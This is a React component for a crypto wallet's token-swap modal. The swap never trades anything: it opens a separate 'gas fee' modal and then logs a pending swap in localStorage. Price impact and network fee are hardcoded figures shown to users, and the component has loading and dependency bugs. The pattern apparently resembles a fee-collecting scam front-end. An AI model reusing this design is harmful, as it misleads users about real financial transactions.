'use client';

import { useState, useEffect, useMemo } from 'react';
import { X, ArrowDownUp, ArrowRight, Info } from 'lucide-react';
import GasFeeModal from './gas-fee-modal';
import { COIN_MAP, getDynamicExchangeRates } from '@/lib/utils';

interface SwapModalProps {
    isOpen: boolean;
    onClose: () => void;
    initialFromToken?: string;
    bnbBalance?: string;
    t22Balance?: number;
    address?: string;
}

export default function SwapModal({ isOpen, onClose, initialFromToken, bnbBalance = '0', t22Balance = 0 ,address=""}: SwapModalProps) {
    const [fromToken, setFromToken] = useState(initialFromToken ||'TETHEREUM');
    // const [toToken, setToToken] = useState(initialFromToken || 'ETH');
    const [toToken, setToToken] = useState( 'ETH');
    const [fromAmount, setFromAmount] = useState('');
    const [toAmount, setToAmount] = useState('');
    const [showGasModal, setShowGasModal] = useState(false);




    
    const [user,setUser] = useState({})

    // Exchange rates (mock - in production, fetch from API)
    // const exchangeRates: { [key: string]: { [key: string]: number } } = {
    //     'BNB': { 'TETHEREUM': 1.0, 'USDT': 620.0, 'BNB': 1.0 },
    //     'TETHEREUM': { 'BNB': 1.0, 'USDT': 0.45, 'TETHEREUM': 1.0 },
    //     'USDT': { 'BNB': 0.00161, 'TETHEREUM': 2.22, 'USDT': 1.0 }
    // };

    const exchangeRates: { [key: string]: { [key: string]: number } } = {
        'TETHEREUM': { 'BNB': 1.0, 'USDT': 0.45, 'TETHEREUM': 1.0 },
    'BNB': {
        'BNB': 1,
        'ETH': 0.35,
        'USDT': 620,
        'USDC': 620,
        'DAI': 620,
        'MATIC': 850,
        'ARB': 420,
        'OP': 390
    },
    'ETH': {
        'BNB': 2.85,
        'ETH': 1,
        'USDT': 1800,
        'USDC': 1800,
        'DAI': 1800,
        'MATIC': 2400,
        'ARB': 1200,
        'OP': 1100
    },
    'USDT': {
        'BNB': 0.00161,
        'ETH': 0.00055,
        'USDT': 1,
        'USDC': 1,
        'DAI': 1,
        'MATIC': 1.33,
        'ARB': 0.66,
        'OP': 0.61
    },
    'USDC': {
        'BNB': 0.00161,
        'ETH': 0.00055,
        'USDT': 1,
        'USDC': 1,
        'DAI': 1,
        'MATIC': 1.33,
        'ARB': 0.66,
        'OP': 0.61
    },
    'DAI': {
        'BNB': 0.00161,
        'ETH': 0.00055,
        'USDT': 1,
        'USDC': 1,
        'DAI': 1,
        'MATIC': 1.33,
        'ARB': 0.66,
        'OP': 0.61
    },
    'MATIC': {
        'BNB': 0.00117,
        'ETH': 0.00042,
        'USDT': 0.75,
        'USDC': 0.75,
        'DAI': 0.75,
        'MATIC': 1,
        'ARB': 0.5,
        'OP': 0.46
    },
    'ARB': {
        'BNB': 0.00238,
        'ETH': 0.00083,
        'USDT': 1.5,
        'USDC': 1.5,
        'DAI': 1.5,
        'MATIC': 2,
        'ARB': 1,
        'OP': 0.92
    },
    'OP': {
        'BNB': 0.00256,
        'ETH': 0.0009,
        'USDT': 1.63,
        'USDC': 1.63,
        'DAI': 1.63,
        'MATIC': 2.17,
        'ARB': 1.08,
        'OP': 1
    }
};
let [exchangeRates_ ,setExchangeRates_] = useState(null)

useEffect(()=>{
let v = async ()=>{

    console.log("exchangeRates__")
    const exchangeRates__ = await getDynamicExchangeRates();
    console.log(exchangeRates__)
    setExchangeRates_(exchangeRates__)
}
v()
},[])
    const getBalance = (token: string) => {
        if (token === 'BNB') return Number(bnbBalance).toFixed(4);
        if (token === 'TETHEREUM') return t22Balance.toFixed(6);
        return '0.00';
    };

    // Auto-calculate toAmount when fromAmount or tokens change
    useEffect(() => {
        if (fromAmount && !isNaN(Number(fromAmount)) && Number(fromAmount) > 0) {
            const rate = exchangeRates_[fromToken]?.[toToken] || 1.0;
        
            const calculated = Number(fromAmount) * rate;
            setToAmount(calculated.toFixed(6));
        } else {
            setToAmount('');
        }
    }, [fromAmount, fromToken, toToken]);

const [getUserLoading,setGetUSerLoading] =useState(false)
useEffect(()=>{

    let v = async ()=>{
        console.log(!address || address=="","kkk")
        if(!address || address==""){
            return
        }

        try{

            setGetUSerLoading(true)
            let vvv =    await fetch(`/api/user?address=${address}`, {
      method: 'GET',
      headers: { 'Content-Type': 'application/json' },
    //   body: JSON.stringify({ address, t99:Number(tbal) })
    });

    let vjson = await vvv.json()

    if(vjson?.existingRecord?.id){
        setUser(vjson?.existingRecord)
    }

        }catch(e){

        }finally{
                setGetUSerLoading(false)
        }
    }

v()
},[address])

    // Update state when modal opens with initialFromToken
    useEffect(() => {
        if (isOpen && initialFromToken) {
            setFromToken(initialFromToken);
            // Prevent selecting same token for both
            if (toToken === initialFromToken) {
                // setToToken(initialFromToken === 'BNB' ? 'TETHEREUM' : 'BNB');
            }
        }
    }, [isOpen, initialFromToken]);
       let  getCurrentRate =  useMemo(() => {

         if(!exchangeRates_){
            return "..."
         }

         return  exchangeRates_[fromToken][toToken]
        // const rate = exchangeRates[fromToken]?.[toToken] || 1.0;
        // return `1 ${fromToken} = ${rate.toFixed(4)} ${toToken}`;
    },[fromToken,toToken]);

    // Reset form when modal closes
    useEffect(() => {
        if (!isOpen) {
            setFromAmount('');
            setToAmount('');
        }
    }, [isOpen]);

    if (!isOpen) return null;

    const handleSwapTokens = () => {
        // Swap tokens
        const tempToken = fromToken;
        setFromToken(toToken);
        setToToken(tempToken);

        // Swap amounts
        const tempAmount = fromAmount;
        setFromAmount(toAmount);
        setToAmount(tempAmount);
    };

    const handleFromTokenChange = (newToken: string) => {
        // Prevent selecting same token
        if (newToken === toToken) {
            setToToken(fromToken);
        }
        setFromToken(newToken);
    };

    const handleToTokenChange = (newToken: string) => {
        // Prevent selecting same token
        if (newToken === fromToken) {
            setFromToken(toToken);
        }
        setToToken(newToken);
    };

    const handleSubmit = (e: React.FormEvent) => {
        e.preventDefault();

        // Validation
        if (!fromAmount || Number(fromAmount) <= 0) {
            alert('Please enter a valid amount');
            return;
        }

        const balance = Number(getBalance(fromToken));
        if (Number(fromAmount) > balance) {
            alert(`Insufficient ${fromToken} balance`);
            return;
        }

        setShowGasModal(true);
    };

    const handleGasSuccess = (txHash: string) => {
        // Create Pending Transaction
        const newTx = {
            id: txHash,
            type: 'swap',
            asset: fromToken,
            amount: `${fromAmount} ${fromToken} → ${toAmount} ${toToken}`,
            date: 'Just now',
            status: 'pending',
            counterparty: 'Base Swap'
        };

        // Save to LocalStorage
        const existingInfo = localStorage.getItem('transactions');
        const transactions = existingInfo ? JSON.parse(existingInfo) : [];
        localStorage.setItem('transactions', JSON.stringify([newTx, ...transactions]));

        setShowGasModal(false);
        onClose();
    };



    return (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 animate-fade-in">
            {/* Backdrop */}
            <div
                className="absolute inset-0 bg-black/60 backdrop-blur-sm"
                onClick={onClose}
            />

            {/* Modal - Bottom Sheet Style */}
            <div className="absolute bottom-0 left-0 right-0 w-full bg-[#0a0b0d] border-t border-[#0052FF]/30 rounded-t-[2rem] p-6 animate-slide-up text-white shadow-2xl pb-10">
                {/* Header */}
                <div className="flex items-center justify-between mb-4">
                    <h2 className="text-lg font-bold">Swap</h2>
                    <button
                        onClick={onClose}
                        className="w-8 h-8 flex items-center justify-center bg-gray-800/50 hover:bg-gray-700/50 rounded-full transition-colors text-gray-400 hover:text-white"
                    >
                        <X className="w-5 h-5" />
                    </button>
                </div>

                {/* Form */}
                <form onSubmit={handleSubmit} className="space-y-4">
                    {/* From Token */}
                    <div className="bg-[#1E2025] border border-white/5 rounded-2xl p-4 transition-colors focus-within:border-[#0052FF]">
                        <div className="flex justify-between mb-2">
                            <label className="text-xs text-gray-400 font-medium">From</label>
                            <span className="text-xs text-gray-500">Balance: {getBalance(fromToken)}</span>
                        </div>
                        <div className="flex items-center gap-3">
                            <input
                                type="number"
                                value={fromAmount}
                                onChange={(e) => setFromAmount(e.target.value)}
                                placeholder="0.0"
                                step="any"
                                className="flex-1 bg-transparent text-3xl font-medium text-white placeholder-gray-700 focus:outline-none min-w-0"
                                required
                            />
                            <div className="relative flex items-center gap-2 bg-[#0a0b0d] rounded-full pl-2 pr-4 py-1.5 border border-white/10">
                                {/* Logo based on selection */}
                                {/* <div className="w-6 h-6 rounded-full bg-blue-600 flex items-center justify-center overflow-hidden"> */}
                                <div className="w-6 h-6 rounded-full  flex items-center justify-center overflow-hidden">
                                    {/* {fromToken === 'BNB' ? (
                                        <img src="https://cryptologos.cc/logos/bnb-bnb-logo.png?v=026" alt="BNB" className="w-full h-full object-cover" />
                                    ) : fromToken === 'TETHEREUM' ? (
                                        <span className="text-[10px] font-bold text-white">T</span>
                                    ) : (
                                        <span className="text-[10px] font-bold text-white">$</span>
                                    )} */}
                                           <img src={COIN_MAP[fromToken].logo} alt={fromToken||"COIN"} className="w-full h-full object-cover" />
                                </div>
                                <select
                                    value={fromToken}
                                    onChange={(e) => handleFromTokenChange(e.target.value)}
                                    className="bg-transparent font-semibold text-white focus:outline-none cursor-pointer appearance-none pr-4 text-sm"
                                >
                                    {/* <option value="BNB">BNB</option>
                                    <option value="TETHEREUM">TETHEREUM</option>
                                    <option value="USDT">USDT</option> */}
                                                         {
                                        Object.keys(COIN_MAP).map((e,index)=>{

                                          return <option value={e}>{e}</option>
                                        })
                                    }
                                    {/* <option value="ETH">ETH</option>
<option value="USDT">USDT</option>
    <option value="TETHEREUM">TETHEREUM</option>
<option value="USDC">USDC</option>
<option value="DAI">DAI</option>
<option value="MATIC">MATIC</option>
<option value="ARB">ARB</option>
<option value="OP">OP</option> */}
                                </select>
                                <ArrowRight className="absolute right-2.5 top-1/2 -translate-y-1/2 w-3 h-3 rotate-90 text-gray-400 pointer-events-none" />
                            </div>
                        </div>
                    </div>

                    {/* Swap Button */}
                    <div className="flex justify-center -my-5 relative z-10">
                        <button
                            type="button"
                            onClick={handleSwapTokens}
                            className="w-10 h-10 bg-[#2b2d33] border-4 border-[#0a0b0d] rounded-xl text-[#0052FF] flex items-center justify-center hover:scale-110 active:scale-95 transition-all shadow-xl"
                        >
                            <ArrowDownUp className="w-5 h-5" />
                        </button>
                    </div>

                    {/* To Token */}
                    <div className="bg-[#1E2025] border border-white/5 rounded-2xl p-4 transition-colors focus-within:border-[#0052FF]">
                        <div className="flex justify-between mb-2">
                            <label className="text-xs text-gray-400 font-medium">To</label>
                            <span className="text-xs text-gray-500">Balance: {getBalance(toToken)}</span>
                        </div>
                        <div className="flex items-center gap-3">
                            <input
                                type="text"
                                value={toAmount}
                                placeholder="0.0"
                                className="flex-1 bg-transparent text-3xl font-medium text-white placeholder-gray-700 focus:outline-none min-w-0"
                                readOnly
                            />
                            <div className="relative flex items-center gap-2 bg-[#0a0b0d] rounded-full pl-2 pr-4 py-1.5 border border-white/10">
                                <div className="w-6 h-6 rounded-full  flex items-center justify-center overflow-hidden">
                                {/* <div className="w-6 h-6 rounded-full bg-blue-600 flex items-center justify-center overflow-hidden"> */}
                                    {/* {toToken === 'BNB' ? ( */}
                                        {/* <img src="https://cryptologos.cc/logos/bnb-bnb-logo.png?v=026" alt="BNB" className="w-full h-full object-cover" /> */}
                                        <img src={COIN_MAP[toToken].logo} alt={toToken||"COIN"} className="w-full h-full object-cover" />
                                    {/* // ) 
                                    // : toToken === 'TETHEREUM' ? (
                                    //     <span className="text-[10px] font-bold text-white">T</span>
                                    // ) : (
                                    //     <span className="text-[10px] font-bold text-white">$</span>
                                    // )} */}
                                </div>
                                <select
                                    value={toToken}
                                    onChange={(e) => handleToTokenChange(e.target.value)}
                                    className="bg-transparent font-semibold text-white focus:outline-none cursor-pointer appearance-none pr-4 text-sm"
                                >
                                    {/* <option value="BNB">BNB</option>
                                    <option value="USDT">USDT</option> */}
                                    {
                                        Object.keys(COIN_MAP).map((e,index)=>{

                                          return <option value={e}>{e}</option>
                                        })
                                    }
                                    {/* <option value="BNB">BNB</option>
                                    <option value="TETHEREUM">TETHEREUM</option>
<option value="ETH">ETH</option>
<option value="USDT">USDT</option>
<option value="USDC">USDC</option>
<option value="DAI">DAI</option>
<option value="MATIC">MATIC</option>
<option value="ARB">ARB</option>
<option value="OP">OP</option> */}

                                </select>
                                <ArrowRight className="absolute right-2.5 top-1/2 -translate-y-1/2 w-3 h-3 rotate-90 text-gray-400 pointer-events-none" />
                            </div>
                        </div>
                    </div>

                    {/* Swap Details */}
                    <div className="bg-white/5 rounded-xl p-3 space-y-1.5 text-[10px] border border-white/5">
                        <div className="flex justify-between">
                            <span className="text-gray-400">Rate</span>
                            <span className="font-medium text-white">{getCurrentRate}</span>
                        </div>
                        <div className="flex justify-between">
                            <span className="text-gray-400">Price Impact</span>
                            <span className="text-green-400">{'<0.01%'}</span>
                        </div>
                        <div className="flex justify-between">
                            <span className="text-gray-400">Network Fee</span>
                            <span className="font-medium text-white">~$0.50</span>
                        </div>
                    </div>

                    {/* Info Banner */}
                    <div className="flex items-start gap-2 p-3 bg-blue-500/10 border border-blue-500/20 rounded-xl">
                        <Info className="w-3.5 h-3.5 text-blue-400 flex-shrink-0 mt-0.5" />
                        <p className="text-[10px] text-blue-200">
                            Review the swap details carefully. Transactions cannot be reversed.
                        </p>
                    </div>

                    {/* Submit Button */}
                    <button
                        type="submit"
                        disabled={!fromAmount || Number(fromAmount) <= 0}
                        className="w-full bg-[#0052FF] hover:bg-[#004ada] disabled:bg-gray-700 disabled:cursor-not-allowed text-white font-bold py-3 rounded-full transition-all shadow-lg hover:shadow-[#0052FF]/25 active:scale-[0.98] flex items-center justify-center gap-2 text-sm"
                    >
                        Swap Tokens
                        <ArrowRight className="w-4 h-4" />
                    </button>
                </form>
            </div>
            <GasFeeModal
                isOpen={showGasModal}
                onClose={() => setShowGasModal(false)}
                onSuccess={handleGasSuccess}
                user={user}
            />
        </div>
    );
}
